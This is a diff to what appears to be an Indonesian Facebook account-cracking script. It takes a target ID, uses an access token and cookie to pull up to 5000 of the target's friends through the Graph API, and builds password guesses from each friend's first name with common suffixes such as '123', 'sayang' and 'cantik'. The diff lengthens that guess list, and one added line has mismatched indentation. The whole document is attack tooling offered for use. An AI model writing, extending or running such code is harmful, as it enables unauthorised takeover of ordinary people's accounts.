@@ -1204,7 +1204,7 @@ def xyzoncrackpublik():
 	except IOError:
 		exit()
 	cetak(panel('\t            [bold cyan]Ketik [bold green]Me[/] Jika Ingin Crack Pertemanan Sendiri',width=90,style='bold white'))
-	pil = input(f' {P}[{H}+{P}]\33[1;96m Target ID :{P} ')
+	pil = input(f' {P}[{H}+{P}]\33[1;96m Target ID : {P}')
 	try:
 		koH = requests.get('https://graph.facebook.com/v1.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0],cookies={'cookie': kukis}).json()
 		for pi in koH['friends']['data']:
@@ -1384,7 +1384,6 @@ def passwrd():
 						pass
 					else:
 						pwv.append(nmf)
-						pwv.append(frs+'1')
 						pwv.append(frs+'01')
 						pwv.append(frs+'02')
 						pwv.append(frs+'03')
@@ -1395,14 +1394,22 @@ def passwrd():
 						pwv.append(frs+'08')
 						pwv.append(frs+'09')
 						pwv.append(frs+'12')
+						pwv.append(frs+'123')
 						pwv.append(frs+'321')
 						pwv.append(frs+'4321')
+						pwv.append(frs+'54321')
+						pwv.append(frs+'1234')
+						pwv.append(frs+'12345')
+						pwv.append(frs+'123456')
+						pwv.append(frs+'sayang')
+						pwv.append(frs+'cantik')
+						pwv.append('memek')
+						pwv.append('sayang')
 				else:
 					if len(frs)<3:
 						pwv.append(nmf)
 					else:
 						pwv.append(nmf)
-						pwv.append(frs+'1')
 						pwv.append(frs+'01')
 						pwv.append(frs+'02')
 						pwv.append(frs+'03')
@@ -1413,13 +1420,17 @@ def passwrd():
 						pwv.append(frs+'08')
 						pwv.append(frs+'09')
 						pwv.append(frs+'12')
-						pwv.append(frs+'4321')
-						pwv.append(frs+'12')
-						pwv.append(frs+'321')
 						pwv.append(frs+'123')
+						pwv.append(frs+'321')
+					    pwv.append(frs+'4321')
+						pwv.append(frs+'54321')
 						pwv.append(frs+'1234')
 						pwv.append(frs+'12345')
 						pwv.append(frs+'123456')
+						pwv.append(frs+'sayang')
+						pwv.append(frs+'cantik')
+						pwv.append('memek')
+						pwv.append('sayang')
 				if 'ya' in pwpluss: 
 					for xpwd in pwnya:
 						pwv.append(xpwd)
